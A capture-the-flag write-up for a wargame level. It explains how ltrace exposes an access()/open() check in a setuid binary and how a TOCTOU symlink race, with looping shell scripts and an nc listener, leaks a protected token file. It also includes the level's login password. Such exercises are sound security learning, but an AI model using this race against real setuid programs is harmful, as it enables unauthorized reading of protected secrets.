@@ -1,0 +1,157 @@
+# 10
+
+Login
+
+```b
+> ssh level10@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
+> Password: s5cAJpM8ev6XHw998pRWG728z
+```
+
+<details><summary>Tryout</summary>
+
+- 2 files, seen it before
+- try - `cat` - `./level10` - `./level10 token localhost`
+
+```b
+> ls -l
+-rwsr-sr-x+ 1 flag10 level10 10817 level10
+-rw-------  1 flag10 flag10     26 token
+
+> cat token
+cat: token: Permission denied
+
+> ./level10
+./level10 file host
+	sends file to host if you have access to it
+
+> ./level10 token localhost
+You don't have access to ./token
+```
+
+</details>
+
+Problem
+- The main issue here is file `./token` - we dont have its permission
+- `ltrace` - find out how `./level10` checks permission 
+  - it uses `access()` 
+
+```b
+> ltrace ./level10 token localhost
+__libc_start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>
+access("token", 4)                                         = -1
+^^^^^^ 🟡 
+
+printf("You don't have access to %s\n", "token"You don't have access to token
+)           = 31
++++ exited (status 31) +++
+```
+
+- Touch a file of our own, try again
+
+```b
+> ./level10 /tmp/tmp localhost
+Connecting to localhost:6969 .. Unable to connect to host localhost
+
+> ltrace ./level10 /tmp/tmp localhost
+__libc_start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>
+access("/tmp/tmp", 4)                                      = 0
+printf("Connecting to %s:6969 .. ", "localhost")           = 32
+                         ^^^^ 🟡 
+fflush(0xb7fd1a20Connecting to localhost:6969 .. )         = 0
+                                         ^^^^ 🟡 
+```
+
+- The program interacts with `localhiost:6969`
+- we need a valid Host IP : 
+  - `127.0.0.1`, or the old trick
+  - `ifconfig | grep 'inet ' | awk 'NR==2 {print $2}' | cut -d ":" -f2`
+
+```b
+> ./level10 /tmp/tmp $(ifconfig | grep 'inet ' | awk 'NR==2 {print $2}' | cut -d ":" -f2)
+Connecting to Localhost:6969 .. Connected!
+Sending file .. wrote file!
+```
+
+nc, ltrace
+- it opens and reads and sends out `/tmp/tmp` content
+- it sends the content to `Localhost:6969`
+
+```b
+# t1
+> nc -kl 6969
+```
+```b
+# t2
+> touch /tmp/tmp
+> ./level10 /tmp/tmp Localhost
+> Connecting to Localhost:6969 .. Connected!
+Sending file .. wrote file!
+```
+
+- we want it to open/read/send the `token` instead!
+
+```b
+> ltrace ./level10 /tmp/tmp $(ifconfig|grep 'inet '|awk 'NR==2 {print $2}'|cut -d ":" -f2)
+.
+.
+.
+printf("Connected!\nSending file .. "Connected!
+)                     = 27
+fflush(0xb7fd1a20Sending file .. )                                         = 0
+open("/tmp/tmp", 0, 010)                                   = 4
+      ^^^^^^^^ 🟡 here is where our `token` should be read
+
+read(4, "", 4096)                                          = 0
+write(3, "", 0)                                            = 0
+puts("wrote file!"wrote file!
+)                                        = 12
++++ exited (status 12) +++
+```
+
+Goal
+- Figure out a way to force `./level10` to read the true `token`:
+  - exploit `access()`'s [TOCTOU](https://stackoverflow.com/questions/75587120/how-to-handle-toctou-problem-between-access-and-unlink) vulnerability 
+- How: let's create a racing condition
+- Design a file to do the following:
+  - force `access()` to check a low-priority file
+  - then, `open()` and `read()` deal w/ the hi-priority one
+
+Solution:
+- we need a file that _alternates_ its own type
+  - type 1: a symlink to `token`
+  - type 2: a regular file of our own
+- write a script to do this 👇
+
+`alternate.sh`
+
+```b
+rm -rf /tmp/tmp
+t=/tmp/tmp
+while true; do
+  touch $t
+  rm -rf $t
+  ln -s /home/user/level10/token $t
+  rm -rf $t
+done
+```
+
+`runner.sh`
+
+```b
+while true; do  
+  /home/user/level10/level10 /tmp/tmp $(ifconfig|grep 'inet '|awk 'NR==2 {print $2}'|cut -d ":" -f2) >/dev/null
+  #/home/user/level10/level10 /tmp/tmp $(hostname -I|cut -d' ' -f2) >/dev/null
+done
+```
+```b
+> chmod 777 /tmp/alt.sh /tmp/go.sh
+
+> \
+bash /tmp/alt.sh 2>/dev/null & \
+bash /tmp/go.sh  2>/dev/null & \
+nc -kl 6969 | grep -E '[a-z0-9]'
+	OR
+nc -kl 6969 | grep -v '[][()]'
+
+> kill $(jobs -p)
+```
